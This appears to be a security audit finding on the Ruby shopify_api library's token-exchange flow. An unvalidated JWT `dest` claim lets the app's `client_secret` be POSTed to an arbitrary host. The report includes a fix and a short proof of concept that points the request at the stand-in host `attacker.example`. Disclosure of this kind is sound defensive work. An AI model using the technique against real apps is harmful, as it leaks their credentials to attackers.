### Title
Unvalidated JWT `dest` claim used as OAuth token-exchange host, allowing `client_secret` exfiltration via SSRF - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` extracts the `shop` value directly from the `dest` claim of a caller-supplied session (id) token and uses it, unsanitized, as the HTTP host that receives the request body containing the app's `client_id` and `client_secret`.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim with no domain-format check: [1](#0-0) 
The only validation performed on the decoded payload is that `aud == Context.api_key`; `dest`/`iss` are never checked against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`: [2](#0-1) 

`TokenExchange.exchange_token` takes this unsanitized `dest_shop` value and builds a `Session` and an `HttpClient` from it, then POSTs the app's `client_secret` to that host: [3](#0-2) 

`HttpClient#initialize` builds the request base URI directly from `session.shop`: [4](#0-3) 

This is inconsistent with the sibling flows `RefreshToken.refresh_access_token` and `TokenExchange.migrate_to_expiring_token`, both of which call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host that receives the `client_secret`: [5](#0-4) [6](#0-5) 

The binding that should hold is: *host that receives the `client_secret`* == *a domain in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`*. In `exchange_token`, this equality is never checked — the host is taken verbatim from the JWT `dest` claim.

### Impact Explanation
If a session token with an attacker-controlled `dest` value can reach `exchange_token` (e.g., a token whose `dest` is forged, replayed from a different context, or a value the host application read from client-controlled input such as a URL param/header and passed straight to `exchange_token` without itself pre-validating the domain — a pattern documented in `docs/usage/oauth.md` as expected usage), the library will send an HTTPS POST containing `client_id` and `client_secret` (and the `subject_token`) to whatever host `dest` names. This matches the "High" impact bucket: SSRF with the app's credentials / credential leakage to an attacker-controlled host, since `ShopValidator.sanitize!` exists in this exact library specifically to prevent this class of issue elsewhere.

### Likelihood Explanation
Exploitability depends on whether a value reaching `dest` can be attacker-influenced before signature verification is meaningful (e.g., token issued by Shopify but for a non-`myshopify` `dest`, or a host application forwarding a client-supplied token without its own domain checks, relying on this library to sanitize as it does in the parallel `refresh_access_token`/`migrate_to_expiring_token` paths). Given the library explicitly provides `ShopValidator` for exactly this purpose and applies it inconsistently, this is a concrete root-cause gap rather than a theoretical one, though full exploitability requires confirming how `dest` values are sourced in the caller's session-token issuance path.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token` and `RefreshToken.refresh_access_token`) before constructing `shop_session`, so the token-exchange request can only ever be sent to a trusted Shopify domain.

### Proof of Concept
1. Obtain/construct a session token whose `dest` claim is `https://attacker.example` (validated only for `aud == Context.api_key`, no domain check performed by `JwtPayload`).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `dest_shop` becomes `"attacker.example"`; `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sends a POST to `https://attacker.example/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext, as constructed here: [7](#0-6)
